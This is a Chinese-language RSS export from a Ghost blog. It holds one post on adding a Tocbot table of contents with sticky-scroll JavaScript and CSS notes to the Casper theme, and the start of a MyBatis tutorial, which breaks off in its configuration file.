<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[zairesinatra]]></title><description><![CDATA[The best time to recognize yourself is ten years ago, followed by now.]]></description><link>yourdomain.com/</link><image><url>yourdomain.com/favicon.png</url><title>zairesinatra</title><link>yourdomain.com/</link></image><generator>Ghost 5.2</generator><lastBuildDate>Wed, 13 Jul 2022 12:50:21 GMT</lastBuildDate><atom:link href="yourdomain.com/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[G&TOC&CSS]]></title><description><![CDATA[TOC 的需求实现以及相关的思考总结。]]></description><link>yourdomain.com/g-toc-css/</link><guid isPermaLink="false">626d3213eb1f7c0845645cdf</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Sun, 01 May 2022 13:36:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/SLAMDUNK.png" medium="image"/><content:encoded><![CDATA[<div class="kg-card kg-audio-card"><img src="yourdomain.com/content/media/2022/04/------_thumb.jpeg?v=1651341861336" alt="G&amp;TOC&amp;CSS" class="kg-audio-thumbnail"><div class="kg-audio-thumbnail placeholder kg-audio-hide"><svg width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 15.33a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm-2.25.75a2.25 2.25 0 1 1 4.5 0 2.25 2.25 0 0 1-4.5 0ZM15 13.83a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm-2.25.75a2.25 2.25 0 1 1 4.5 0 2.25 2.25 0 0 1-4.5 0Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M14.486 6.81A2.25 2.25 0 0 1 17.25 9v5.579a.75.75 0 0 1-1.5 0v-5.58a.75.75 0 0 0-.932-.727.755.755 0 0 1-.059.013l-4.465.744a.75.75 0 0 0-.544.72v6.33a.75.75 0 0 1-1.5 0v-6.33a2.25 2.25 0 0 1 1.763-2.194l4.473-.746Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M3 1.5a.75.75 0 0 0-.75.75v19.5a.75.75 0 0 0 .75.75h18a.75.75 0 0 0 .75-.75V5.133a.75.75 0 0 0-.225-.535l-.002-.002-3-2.883A.75.75 0 0 0 18 1.5H3ZM1.409.659A2.25 2.25 0 0 1 3 0h15a2.25 2.25 0 0 1 1.568.637l.003.002 3 2.883a2.25 2.25 0 0 1 .679 1.61V21.75A2.25 2.25 0 0 1 21 24H3a2.25 2.25 0 0 1-2.25-2.25V2.25c0-.597.237-1.169.659-1.591Z"/></svg></div><div class="kg-audio-player-container"><audio src="yourdomain.com/content/media/2022/04/------.mp3" preload="metadata"></audio><div class="kg-audio-title"> &#x6674;&#x5929;-&#x5468;&#x6770;&#x4F26;</div><div class="kg-audio-player"><button class="kg-audio-play-icon"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M23.14 10.608 2.253.164A1.559 1.559 0 0 0 0 1.557v20.887a1.558 1.558 0 0 0 2.253 1.392L23.14 13.393a1.557 1.557 0 0 0 0-2.785Z"/></svg></button><button class="kg-audio-pause-icon kg-audio-hide"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><rect x="3" y="1" width="7" height="22" rx="1.5" ry="1.5"/><rect x="14" y="1" width="7" height="22" rx="1.5" ry="1.5"/></svg></button><span class="kg-audio-current-time">0:00</span><div class="kg-audio-time">/<span class="kg-audio-duration">4:29</span></div><input type="range" class="kg-audio-seek-slider" max="100" value="0"><button class="kg-audio-playback-rate">1&#xD7;</button><button class="kg-audio-unmute-icon"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M15.189 2.021a9.728 9.728 0 0 0-7.924 4.85.249.249 0 0 1-.221.133H5.25a3 3 0 0 0-3 3v2a3 3 0 0 0 3 3h1.794a.249.249 0 0 1 .221.133 9.73 9.73 0 0 0 7.924 4.85h.06a1 1 0 0 0 1-1V3.02a1 1 0 0 0-1.06-.998Z"/></svg></button><button class="kg-audio-mute-icon kg-audio-hide"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M16.177 4.3a.248.248 0 0 0 .073-.176v-1.1a1 1 0 0 0-1.061-1 9.728 9.728 0 0 0-7.924 4.85.249.249 0 0 1-.221.133H5.25a3 3 0 0 0-3 3v2a3 3 0 0 0 3 3h.114a.251.251 0 0 0 .177-.073ZM23.707 1.706A1 1 0 0 0 22.293.292l-22 22a1 1 0 0 0 0 1.414l.009.009a1 1 0 0 0 1.405-.009l6.63-6.631A.251.251 0 0 1 8.515 17a.245.245 0 0 1 .177.075 10.081 10.081 0 0 0 6.5 2.92 1 1 0 0 0 1.061-1V9.266a.247.247 0 0 1 .073-.176Z"/></svg></button><input type="range" class="kg-audio-volume-slider" max="100" value="100"></div></div></div><img src="yourdomain.com/content/images/2022/04/SLAMDUNK.png" alt="G&amp;TOC&amp;CSS"><p>GHOST &#x5E76;&#x6CA1;&#x6709;&#x5185;&#x7F6E; Table Of Content &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4E14;&#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;<a href="https://ghost.org/docs/tutorials/adding-a-table-of-contents/">&#x89E3;&#x51B3;&#x65B9;&#x6848;</a>&#x5B58;&#x5728;&#x4E0D;&#x5408;&#x7406;&#x5904;&#xFF0C;&#x9042;&#x81EA;&#x884C;&#x8C03;&#x6574;&#x90E8;&#x5206;&#x6548;&#x679C;&#xFF0C;&#x672C;&#x6587;&#x610F;&#x5728;&#x8BB0;&#x5F55;&#x603B;&#x7ED3;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x3002;</p><!--kg-card-begin: markdown--><h2 id="%E5%88%9D%E6%AD%A5%E5%AE%9E%E7%8E%B0">&#x521D;&#x6B65;&#x5B9E;&#x73B0;</h2>
<p>&#x6309;&#x7167;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF0C;&#x6839;&#x636E;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x4E2D;&#x7684;&#x6807;&#x9898;&#x751F;&#x6210;&#x76EE;&#x5F55;&#x9700;&#x91C7;&#x7528;&#x4E00;&#x6B3E;&#x540D;&#x4E3A; <a href="https://cdnjs.com/libraries/tocbot">Tocbot</a> &#x7684;&#x5C0F;&#x578B;&#x5E93;&#x3002;</p>
<p>&#x5C06;&#x83B7;&#x53D6;&#x5230;&#x7684; Tocbot CSS &#x94FE;&#x63A5;&#x6DFB;&#x52A0;&#x5230; Casper &#x4E3B;&#x9898; default.hbs &#x6587;&#x4EF6;&#x4E2D; &lt;head&gt; &#x6807;&#x7B7E;&#x4F53;&#x5C3E;&#x90E8;&#x3002;</p>
<pre><code class="language-css">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;{{asset &quot;css/screen.css&quot;}}&quot; /&gt;
{{ghost_head}}
</code></pre>
<p>&#x540C;&#x6837;&#x5730;&#x64CD;&#x4F5C; Tocbot JavaScript &#x94FE;&#x63A5;&#x81F3; default.hbs &#x91CC; &lt;/body&gt; &#x6807;&#x7B7E;&#x4E4B;&#x524D;&#x3002;&#x503C;&#x5F97;&#x4E00;&#x63D0;&#x7684;&#x662F;&#xFF0C;&#x968F;&#x7740;&#x7248;&#x672C;&#x66F4;&#x65B0;&#xFF0C;&#x5185;&#x5BB9;&#x9009;&#x62E9;&#x5668;&#x4E0D;&#x518D;&#x662F;&#x5B98;&#x65B9;&#x6240;&#x7ED1;&#x5B9A;&#x7684; .post-content&#xFF0C;&#x800C;&#x662F;&#x6839;&#x636E;&#x6E90;&#x7801;&#x5F97;&#x5230;&#x7684; .gh-content&#x3002;</p>
<pre><code class="language-javascript">&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    tocbot.init({
        tocSelector: &apos;.toc&apos;,
        contentSelector: &apos;.gh-content&apos;,
        hasInnerContainers: true
    });
&lt;/script&gt;
</code></pre>
<p>&#x5BF9;&#x4E8E;&#x9009;&#x62E9;&#x533A;&#x57DF;&#x8FDB;&#x884C;&#x6E32;&#x67D3;&#xFF0C;&#x671F;&#x671B;&#x662F;&#x76EE;&#x5F55;&#x51FA;&#x73B0;&#x5728;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x4E4B;&#x524D;&#xFF0C;&#x56E0;&#x6B64;&#x5728; .post.hbs &#x6587;&#x4EF6;&#x5B8C;&#x6210;&#x5982;&#x4E0B;&#x66F4;&#x65B0;&#x3002;</p>
<pre><code class="language-html">&lt;section class=&quot;gh-content gh-canvas&quot;&gt;
    &lt;aside class=&quot;toc-container&quot;&gt;
        &lt;div class=&quot;toc&quot;&gt;&lt;/div&gt;
    &lt;/aside&gt;
    {{content}}
&lt;/section&gt;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%AE%9A%E5%88%B6%E6%95%88%E6%9E%9C">&#x5B9A;&#x5236;&#x6548;&#x679C;</h2>
<p>&#x672C;&#x4EBA;&#x671F;&#x671B;&#x80FD;&#x5728;&#x6D4F;&#x89C8;&#x6587;&#x7AE0;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5728;&#x4FA7;&#x8FB9;&#x770B;&#x89C1;&#x5373;&#x65F6;&#x7684; TOC &#x9762;&#x677F;&#xFF0C;&#x6545;&#x589E;&#x52A0; TOC &#x968F;&#x9875;&#x9762;&#x6EDA;&#x52A8;&#x66F4;&#x6539;&#x4F4D;&#x7F6E;&#x7684;&#x9700;&#x6C42;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x5176;&#x4ED6;&#x7406;&#x8BBA;&#x53EF;&#x884C;&#x7684;&#x65B9;&#x6848;&#x6765;&#x8BF4;&#xFF0C;&#x90FD;&#x6216;&#x591A;&#x6216;&#x5C11;&#x4E0E;&#x5F53;&#x524D;&#x7248;&#x672C;&#x6E90;&#x7801;&#x5B58;&#x5728;&#x5DEE;&#x5F02;&#xFF0C;&#x6700;&#x5178;&#x578B;&#x7684;&#x662F;&#x5E03;&#x5C40;&#x65B9;&#x5F0F;&#x3002;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;Ghost &#x540E;&#x53F0;&#x5F00;&#x542F;&#x670D;&#x52A1;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x5F88;&#x591A;&#x79CD;&#xFF0C;&#x50CF;&#x662F; PM2&#x3001;&#x4E91;&#x4EE3;&#x7406;&#xFF0C;&#x66F4;&#x6709;&#x751A;&#x8005;&#x76F4;&#x63A5;&#x7528; Node &#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x4E0E; Ghost &#x6A21;&#x6837;&#x4E00;&#x81F4;&#x7684;<a href="https://github.com/styxlab/next-cms-ghost">&#x66FF;&#x4EE3;&#x7248;</a>&#x3002;</p>
<pre><code class="language-javascript">var tc = document.querySelector(&quot;.toc-container&quot;);
var tch = tc.clientHeight;
var ah = document.querySelector(&quot;.article-header&quot;);
var ahh = ah.clientHeight;
window.addEventListener(&quot;scroll&quot;, function () {
if(document.body.clientWidth &gt; 1170){
    var scrollY = document.documentElement.scrollTop || document.body.scrollTop;
    var ihh = window.innerHeight;
	if(scrollY &gt;= ihh + tch + ahh){
		var ctc = document.querySelector(&quot;.toc-container&quot;);
		ctc.style.position=&quot;sticky&quot;;
        ctc.style.position=&quot;-webkit-sticky&quot;;
		ctc.style.top = &quot;120px&quot;;
        ctc.style.marginLeft = &quot;800px&quot;;
        ctc.style.minWidth= &quot;260px&quot;;
	}
    if(scrollY &lt; tch + ahh -10){
        var ctc = document.querySelector(&quot;.toc-container&quot;);
        ctc.style.position=&quot;&quot;;
        ctc.style.top = &quot;&quot;;
        ctc.style.marginLeft = &quot;&quot;;
        console.log(&quot;zszszs&quot;)
    }
}
})
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D">&#x603B;&#x7ED3;&#x53CD;&#x601D;</h2>
<p>Ghost &#x73B0;&#x9636;&#x6BB5;&#x6E90;&#x7801;&#x7684;&#x5E03;&#x5C40;&#x662F;&#x4F7F;&#x7528; Grid &#x4E0E; Flex &#x4EA4;&#x53C9;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x82E5;&#x5728;&#x6539;&#x53D8; TOC &#x5143;&#x7D20;&#x4F4D;&#x7F6E;&#x65F6;&#xFF0C;&#x5C06;&#x5176;&#x539F;&#x6709;&#x4F4D;&#x7F6E;&#x5728; DOM &#x4E0A;&#x79FB;&#x9664;&#xFF0C;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x91CD;&#x6392;&#x6548;&#x679C;&#xFF0C;&#x4F53;&#x9A8C;&#x611F;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x4E14;&#x6D88;&#x8017;&#x6027;&#x80FD;&#x3002;&#x9274;&#x4E8E;&#x9875;&#x9762;&#x53EF;&#x89C6;&#x533A;&#x7684;&#x6EDA;&#x52A8;&#xFF0C;&#x4F7F;&#x7528;&#x8005;&#x4E5F;&#x4E0D;&#x4F1A;&#x5173;&#x6CE8;&#x5230;&#x7559;&#x767D;&#x7684;&#x79FB;&#x52A8;&#x533A;&#xFF0C;&#x6545;&#x4E0D;&#x8003;&#x8651; DOM &#x5143;&#x7D20;&#x7684;&#x6458;&#x9664;&#xFF0C;&#x7EAF;&#x7CB9;&#x4E34;&#x65F6;&#x6027;&#x6539;&#x53D8;&#x5750;&#x6807;&#x3002;</p>
<h3 id="css">CSS</h3>
<p>postion &#x7684;&#x9009;&#x62E9;&#x65B9;&#x5F0F;&#x4E0A;&#xFF0C;&#x6BD4;&#x8F83;&#x56FA;&#x5B9A;&#x5B9A;&#x4F4D; fixed &#x4E0E;&#x7C98;&#x6027;&#x5B9A;&#x4F4D; sticky&#x3002;&#x4E8C;&#x8005;&#x90FD;&#x53EF;&#x4EE5;&#x5728;&#x62D6;&#x52A8;&#x6EDA;&#x52A8;&#x6761;&#x65F6;&#xFF0C;&#x56FA;&#x5B9A;&#x5143;&#x7D20;&#x4E8E;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x3002;&#x4F46;&#x662F;&#x5728;&#x6548;&#x679C;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x662F;&#x76F4;&#x63A5;&#x56FA;&#x5B9A;&#x4E8E;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#xFF0C;&#x540E;&#x8005;&#x5728;&#x8FBE;&#x5230;&#x4E34;&#x754C;&#x503C;&#x65F6;&#x8FDB;&#x884C;&#x56FA;&#x5B9A;&#x3002;&#x5728;&#x6027;&#x8D28;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x8131;&#x79BB;&#x6587;&#x6863;&#x6D41;&#xFF0C;&#x540E;&#x8005;&#x4E0D;&#x8131;&#x79BB;&#x6587;&#x6863;&#x6D41;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x65E0;&#x9700;&#x6307;&#x5B9A; top&#x3001;button&#x3001;left&#x3001;right &#x4E2D;&#x7684;&#x4EFB;&#x4E00;&#x503C;&#xFF0C;&#x5C31;&#x80FD;&#x4EE5;&#x5F53;&#x524D;&#x89C6;&#x53E3;&#x8FDB;&#x884C;&#x5B9A;&#x4F4D;&#x3002;&#x540E;&#x8005;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x5176;&#x4E00;&#xFF0C;&#x7136;&#x540E;&#x76F8;&#x5BF9;&#x6700;&#x8FD1;&#x6EDA;&#x52A8;&#x7956;&#x5148;&#x8FDB;&#x884C;&#x504F;&#x79FB;&#x3002;</p>
<p>Ghost &#x6E90;&#x7801;&#x7684;&#x89C6;&#x7A97;&#x5355;&#x4F4D;&#x51FA;&#x73B0;&#x8F83;&#x4E30;&#x5BCC;&#x3002;viewport &#x662F;&#x6D4F;&#x89C8;&#x5668;&#x5B9E;&#x9645;&#x663E;&#x793A;&#x5185;&#x5BB9;&#x7684;&#x533A;&#x57DF;&#xFF0C;&#x5373;&#x4E0D;&#x5305;&#x62EC;&#x5DE5;&#x5177;&#x680F;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x533A;&#x57DF;&#x3002;</p>
<pre><code class="language-javascript">// A viewport with width 1000px and height 800px
vw =&gt; viewport &#x9AD8;&#x5EA6;&#x7684;&#x767E;&#x5206;&#x6BD4; =&gt; 50vw = 500px
vh =&gt; viewport &#x9AD8;&#x5EA6;&#x7684;&#x767E;&#x5206;&#x6BD4; =&gt; 50vh = 400px
vmin =&gt; vw &#x548C; vh &#x4E2D;&#x8F83;&#x5C0F;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x767E;&#x5206;&#x6BD4;&#x5355;&#x4F4D; =&gt; 50vim = 400px
vmax =&gt; vw &#x548C; vh &#x4E2D;&#x8F83;&#x5927;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x767E;&#x5206;&#x6BD4;&#x5355;&#x4F4D; =&gt; 50vmax = 500px
</code></pre>
<pre><code class="language-css">/* &#x5E94;&#x7528; */
/* &#x5B50;&#x5143;&#x7D20;&#x7684;&#x5927;&#x5C0F;&#x76F8;&#x5BF9;&#x4E8E;&#x7A97;&#x53E3;&#x6539;&#x53D8;&#x800C;&#x4E0D;&#x662F;&#x7236;&#x5143;&#x7D20; */
.parent { width: 100px; }
.child { width: 50vw; }
/* &#x54CD;&#x5E94;&#x5782;&#x76F4;&#x5C45;&#x4E2D; */
.verticalresponsecentering{ width: 50vw; height: 50vh; margin: 25vh auto; }
.verticalresponsecentering{ width: 50vw; height: 50vh; margin: 25vh 25vw; }
</code></pre>
<h3 id="javascript">Javascript</h3>
<p>&#x5728;&#x6548;&#x679C;&#x5B9E;&#x73B0;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6EDA;&#x52A8;&#x76D1;&#x542C;&#x4E8B;&#x4EF6;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6EDA;&#x52A8;&#x8DDD;&#x79BB;&#xFF0C;&#x5E94;&#x6CE8;&#x610F;&#x9875;&#x9762;&#x7AEF;&#x4E0E;&#x5230;&#x79FB;&#x52A8;&#x7AEF;&#x7684;&#x517C;&#x5BB9;&#xFF1B;&#x540C;&#x65F6;&#x4E5F;&#x5E94;&#x6CE8;&#x610F;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x5C3A;&#x5BF8;&#x4E0E;&#x89C6;&#x53E3;&#x9AD8;&#x5BBD;&#x7684;&#x95EE;&#x9898;&#x3002;&#x76F8;&#x5173;&#x94FE;&#x63A5;&#x4E8E;&#x6587;&#x672B;&#x3002;</p>
<pre><code class="language-javascript">// &#x517C;&#x5BB9;&#x6027;
// &#x9875;&#x9762;&#x7AEF;&#x652F;&#x6301; document.documentElement,&#x79FB;&#x52A8;&#x7AEF;&#x652F;&#x6301; document.body
var scrollY = document.documentElement.scrollTop || document.body.scrollTop;
// &#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x4E0D;&#x540C;&#x5E73;&#x53F0;&#x4E0A;&#x7684;&#x6EDA;&#x52A8;&#x5BB9;&#x5668; =&gt; document.scrollingElement
// &#x5728;&#x684C;&#x9762;&#x7AEF; document.scrollingElement &#x5C31;&#x662F; document.documentElement/&#x5728;&#x79FB;&#x52A8;&#x7AEF; document.scrollingElement &#x5C31;&#x662F; document.body
document.scrollingElement.scrollTop = 0; // &#x4E00;&#x884C;&#x4EE3;&#x7801;&#x56DE;&#x6EDA;&#x9876;&#x90E8; =&gt; &#x517C;&#x5BB9;pc&#x4E0E;&#x79FB;&#x52A8;
</code></pre>
<pre><code class="language-javascript">// &#x6CE8;&#x610F; document.body.xxx &#x60C5;&#x51B5;
Element.clientWidth|clientHeight // &#x5143;&#x7D20;&#x7684;&#x5185;&#x90E8;&#x5BBD;&#x5EA6;|&#x9AD8;&#x5EA6; =&gt; &#x5305;&#x62EC;&#x5185;&#x8FB9;&#x8DDD; padding,&#x4F46;&#x4E0D;&#x5305;&#x62EC;&#x8FB9;&#x6846; border&#x3001;&#x5916;&#x8FB9;&#x8DDD; margin &#x548C;&#x5782;&#x76F4;&#x6EDA;&#x52A8;&#x6761;
Element.offsetWidth|offsetHeight // &#x53EA;&#x8BFB;&#x5C5E;&#x6027; =&gt; &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5E03;&#x5C40;&#x5BBD;&#x5EA6;|&#x9AD8;&#x5EA6; =&gt; &#x5305;&#x542B;&#x5143;&#x7D20;&#x7684;&#x8FB9;&#x6846; border&#x3001;&#x6C34;&#x5E73;&#x7EBF;&#x4E0A;&#x7684;&#x5185;&#x8FB9;&#x8DDD; padding&#x3001;&#x7AD6;&#x76F4;&#x65B9;&#x5411;&#x6EDA;&#x52A8;&#x6761; scrollbar
Element.scrollWidth|scrollHeight // &#x5143;&#x7D20;&#x5185;&#x5BB9;&#x5BBD;&#x5EA6;|&#x9AD8;&#x5EA6;&#x7684;&#x5EA6;&#x91CF;
Element.scrollTop|scrollLeft // &#x83B7;&#x53D6;&#x6216;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5185;&#x5BB9;&#x5782;&#x76F4;&#x6EDA;&#x52A8;&#x7684;&#x50CF;&#x7D20;&#x6570;|&#x8BFB;&#x53D6;&#x6216;&#x8BBE;&#x7F6E;&#x5143;&#x7D20;&#x6EDA;&#x52A8;&#x6761;&#x5230;&#x5143;&#x7D20;&#x5DE6;&#x8FB9;&#x7684;&#x8DDD;&#x79BB;

window.screenTop|screenLeft // &#x4ECE;&#x5305;&#x62EC;&#x5DE5;&#x5177;&#x680F;&#x7684;&#x7528;&#x6237;&#x6D4F;&#x89C8;&#x5668;&#x4E0A;|&#x5DE6;&#x8FB9;&#x754C;&#x5230;&#x5C4F;&#x5E55;&#x6700;&#x9876;&#x7AEF;&#x8DDD;&#x79BB;
window.screen.height|width // &#x8FD4;&#x56DE;&#x8BBF;&#x95EE;&#x8005;&#x5C4F;&#x5E55;&#x7684;&#x9AD8;&#x5EA6;|&#x5BBD;&#x5EA6; =&gt; 900|1440
window.innerHeight|innerWidth // &#x89C6;&#x7A97;&#x7684;&#x5185;&#x90E8;&#x9AD8;&#x5EA6;|&#x5BBD;&#x5EA6;

window.pageYOffset // &#x53EA;&#x8BFB; =&gt; scrollTop &#x53EF;&#x8BBE;&#x7F6E;,&#x5177;&#x6709;&#x56DE;&#x9876;&#x90E8;&#x6548;&#x679C;

window.screen.availHeight|availWidth // &#x8FD4;&#x56DE;&#x5305;&#x542B;&#x5DE5;&#x5177;&#x680F;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#x53EF;&#x5360;&#x7528;&#x7684;&#x5782;&#x76F4;|&#x6C34;&#x5E73;&#x7A7A;&#x95F4;,&#x5373;&#x6700;&#x5927;&#x9AD8;&#x5EA6;|&#x5BBD;&#x5EA6; =&gt; 825|1440
</code></pre>
<!--kg-card-end: markdown--><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://javascript.info/size-and-scroll"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Element size and scrolling</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://javascript.info/img/favicon/apple-touch-icon-precomposed.png" alt="G&amp;TOC&amp;CSS"></div></div><div class="kg-bookmark-thumbnail"><img src="https://javascript.info/img/site_preview_en_1200x630.png" alt="G&amp;TOC&amp;CSS"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CSS Grid &#x7F51;&#x683C;&#x5E03;&#x5C40;&#x6559;&#x7A0B; - &#x962E;&#x4E00;&#x5CF0;&#x7684;&#x7F51;&#x7EDC;&#x65E5;&#x5FD7;</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://www.ruanyifeng.com/favicon.ico" alt="G&amp;TOC&amp;CSS"><span class="kg-bookmark-author">&#x962E;&#x4E00;&#x5CF0;&#x7684;&#x7F51;&#x7EDC;&#x65E5;&#x5FD7;</span><span class="kg-bookmark-publisher">&#x962E;&#x4E00;&#x5CF0;</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.wangbase.com/blogimg/asset/201903/1_bg2019032501.png" alt="G&amp;TOC&amp;CSS"></div></a></figure><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[MyBatis]]></title><description><![CDATA[半自动 ORM Object Relation Mapping 持久层框架 MyBatis]]></description><link>yourdomain.com/mybatis/</link><guid isPermaLink="false">629a4c721d916b20167df5fa</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Wed, 02 Feb 2022 13:44:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/07/GreenTreesUnderBlueSky.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<img src="yourdomain.com/content/images/2022/07/GreenTreesUnderBlueSky.jpg" alt="MyBatis"><p>JDBC &#x5B58;&#x5728;&#x786C;&#x7F16;&#x7801;&#x548C;&#x8026;&#x5408;&#x5EA6;&#x9AD8;&#x7684;&#x95EE;&#x9898;&#xFF1B;&#x5168;&#x81EA;&#x52A8;&#x6846;&#x67B6; Hibernate &#x4E0D;&#x6613;&#x4F5C;&#x7279;&#x6B8A;&#x4F18;&#x5316;&#xFF0C;&#x4E14;&#x53CD;&#x5C04;&#x64CD;&#x4F5C;&#x8FC7;&#x591A;&#x3002;</p>
<h3 id="maven-%E9%85%8D%E7%BD%AE">maven &#x914D;&#x7F6E;</h3>
<pre><code class="language-xml">&lt;!-- pom.xml --&gt;
&lt;dependencies&gt;
    &lt;!-- Mybatis&#x6838;&#x5FC3; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
        &lt;version&gt;3.5.7&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- junit&#x6D4B;&#x8BD5; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;junit&lt;/groupId&gt;
        &lt;artifactId&gt;junit&lt;/artifactId&gt;
        &lt;version&gt;4.12&lt;/version&gt;
        &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
    &lt;!-- MySQL&#x9A71;&#x52A8; --&gt;
    &lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;mysql&lt;/groupId&gt;
        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
        &lt;version&gt;8.0.29&lt;/version&gt;
    &lt;/dependency&gt;
    &lt;!-- log4j&#x65E5;&#x5FD7; --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j&lt;/artifactId&gt;
        &lt;version&gt;1.2.17&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<h3 id="%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</h3>
<p><code>src/main/resources</code> &#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6; <code>mybatis-config.xml</code> &#x7528;&#x4E8E;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x73AF;&#x5883;&#x4EE5;&#x53CA; MyBatis &#x5168;&#x5C40;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x3002;&#x6574;&#x5408; Spring &#x4E4B;&#x540E;&#xFF0C;&#x6B64;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53EF;&#x7701;&#x7565;&#x3002;</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE configuration
        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;
